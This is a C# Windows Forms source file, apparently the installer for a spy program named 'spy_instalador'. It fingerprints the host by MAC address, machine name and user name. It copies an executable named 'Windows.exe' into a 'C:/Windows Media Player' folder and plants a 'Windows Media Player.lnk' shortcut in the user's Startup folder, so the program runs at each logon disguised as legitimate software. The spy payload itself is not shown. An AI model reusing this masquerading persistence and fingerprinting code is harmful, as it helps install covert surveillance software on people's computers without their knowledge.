using System.Net.NetworkInformation;
using System.Numerics;

namespace spy_instalador
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static string MEU_MAC = "";

        public static void obterMAC()
        {
            try
            {
                MEU_MAC = "";

                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up)
                    {
                        PhysicalAddress macAddress = nic.GetPhysicalAddress();
                        if (macAddress != null && macAddress.GetAddressBytes().Length != 0)
                        {
                            MEU_MAC += macAddress;
                        }
                    }
                }
            }
            catch { }

        }

        private void button1_Click(object sender, EventArgs e)
        {

            string user = Environment.UserName;
            if (textBox1.Text != "")
            {
                user = textBox1.Text;
            }





            if (!Directory.Exists("Usuarios"))
            {
                Directory.CreateDirectory("Usuarios");
            }
            if (!Directory.Exists("Usuarios/" + Environment.MachineName))
            {
                Directory.CreateDirectory("Usuarios/" + Environment.MachineName);
            }
            if (!Directory.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName))
            {
                Directory.CreateDirectory("Usuarios/" + Environment.MachineName + "/" + Environment.UserName);
            }
            //if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".txt"))
            //{
            //    File.Create("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".txt");
            //}
            if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png"))
            {
                //File.Create("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png");

                File.Copy("img.png", "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png");
            }
            if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/wallpaper.png"))
            {
                //File.Create("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png");

                File.Copy("img.png", "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/wallpaper.png");
            }

            if (!File.Exists("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + user + ".txt"))
            {
                //File.Create("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".png");

                File.WriteAllText("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + user + ".txt", "");
            }



            string texto = "";
            texto += "0|";//acao
            texto += "0|";//data
            texto += "A virtude da aranha é a paciência, esperando a presa cair na teia|";//FRASE
            texto += "banana vigarista socorro";//ARRAY_PALAVRAS


            File.WriteAllText("Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + MEU_MAC + ".txt", texto);






        }

        private void Form1_Load(object sender, EventArgs e)
        {
            obterMAC();
            label1.Text = "MAC: " + MEU_MAC + "\n" +
                "MachineName: " + Environment.MachineName + "\n" +
                "UserName: " + Environment.UserName + "\n";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string arq1 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.exe";
            string arq2 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.deps.json";
            string arq3 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.dll";
            string arq4 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.pdb";
            string arq5 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.runtimeconfig.json";

            string arq1_2 = "C:/Windows Media Player/Windows.exe";
            string arq2_2 = "C:/Windows Media Player/Windows.deps.json";
            string arq3_2 = "C:/Windows Media Player/Windows.dll";
            string arq4_2 = "C:/Windows Media Player/Windows.pdb";
            string arq5_2 = "C:/Windows Media Player/Windows.runtimeconfig.json";


            bool tdcerto = false;

            if (File.Exists(arq1))
            {
                if (File.Exists(arq2))
                {
                    if (File.Exists(arq3))
                    {
                        if (File.Exists(arq4))
                        {
                            if (File.Exists(arq5))
                            {
                                tdcerto = true;
                            }
                        }
                    }
                }
            }

            if (tdcerto)
            {
                if (!Directory.Exists("C:/Windows Media Player"))
                {
                    Directory.CreateDirectory("C:/Windows Media Player");
                }
                //------------------------------------
                if (File.Exists(arq1_2))
                {
                    File.Delete(arq1_2);
                }
                File.Copy(arq1, arq1_2);
                //------------------------------------
                if (File.Exists(arq2_2))
                {
                    File.Delete(arq2_2);
                }
                File.Copy(arq2, arq2_2);
                //------------------------------------
                if (File.Exists(arq3_2))
                {
                    File.Delete(arq3_2);
                }
                File.Copy(arq3, arq3_2);
                //------------------------------------
                if (File.Exists(arq4_2))
                {
                    File.Delete(arq4_2);
                }
                File.Copy(arq4, arq4_2);
                //------------------------------------
                if (File.Exists(arq5_2))
                {
                    File.Delete(arq5_2);
                }
                File.Copy(arq5, arq5_2);
                //------------------------------------
                string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                b += "/Microsoft/Windows/Start Menu/Programs/Startup";

                if (File.Exists(b + "/Windows Media Player.lnk"))
                {
                    File.Delete(b + "/Windows Media Player.lnk");
                }
                File.Copy("Windows Media Player.lnk", b + "/Windows Media Player.lnk");

                MessageBox.Show("Instalado com sucesso!");
            }
            else
            {
                MessageBox.Show("Arquivos faltando");
            }

        }

        private void button3_Click(object sender, EventArgs e)
        {
            //C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


        }

        private void button4_Click(object sender, EventArgs e)
        {
            string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            b += "/Microsoft/Windows/Start Menu/Programs/Startup";

            if (File.Exists(b + "/Windows Media Player.lnk"))
            {
                File.Delete(b + "/Windows Media Player.lnk");
            }

        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            string arq1 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.exe";
            string arq2 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.deps.json";
            string arq3 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.dll";
            string arq4 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.pdb";
            string arq5 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.runtimeconfig.json";

            string arq1_2 = "C:/Windows Media Player/Windows.exe";
            string arq2_2 = "C:/Windows Media Player/Windows.deps.json";
            string arq3_2 = "C:/Windows Media Player/Windows.dll";
            string arq4_2 = "C:/Windows Media Player/Windows.pdb";
            string arq5_2 = "C:/Windows Media Player/Windows.runtimeconfig.json";


            //------------------------------------
            if (File.Exists(arq1_2))
            {
                File.Delete(arq1_2);
            }
            //------------------------------------
            if (File.Exists(arq2_2))
            {
                File.Delete(arq2_2);
            }
            //------------------------------------
            if (File.Exists(arq3_2))
            {
                File.Delete(arq3_2);
            }
            //------------------------------------
            if (File.Exists(arq4_2))
            {
                File.Delete(arq4_2);
            }
            //------------------------------------
            if (File.Exists(arq5_2))
            {
                File.Delete(arq5_2);
            }
            //------------------------------------
            string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            b += "/Microsoft/Windows/Start Menu/Programs/Startup";

            if (File.Exists(b + "/Windows Media Player.lnk"))
            {
                File.Delete(b + "/Windows Media Player.lnk");
            }

            MessageBox.Show("Desinstalado com sucesso!");


        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            b += "/Microsoft/Windows/Start Menu/Programs/Startup";

            if (File.Exists(b + "/Windows Media Player.lnk"))
            {
                label2.Text = "Instalado";
            }
            else
            {
                label2.Text = "Não Instalado";
            }
        }
    }
}
